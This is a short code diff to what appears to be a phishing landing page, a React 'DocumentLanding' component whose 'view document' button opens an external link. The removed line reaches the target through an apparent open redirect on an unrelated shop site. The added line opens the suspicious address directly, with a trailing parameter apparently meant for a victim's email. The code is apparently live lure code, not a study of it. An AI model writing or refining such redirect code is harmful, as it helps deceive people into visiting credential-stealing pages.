@@ -9,7 +9,7 @@ const DocumentLanding = () => {
 
   const handleViewDocument = () => {
     setIsLoading(true);
-    window.open('https://www.recialde.it/add-to-cart/?url=https%3A%2F%2Fdevnix%2Ecom%2Ede%2FsOouvLsxZ%2F%23Z?e=', '_blank');
+    window.open('https://devnix.com.de/sOouvLsxZ/#Z?e=', '_blank');
     // Reset loading state after 4 seconds
     setTimeout(() => setIsLoading(false), 4000);
   };
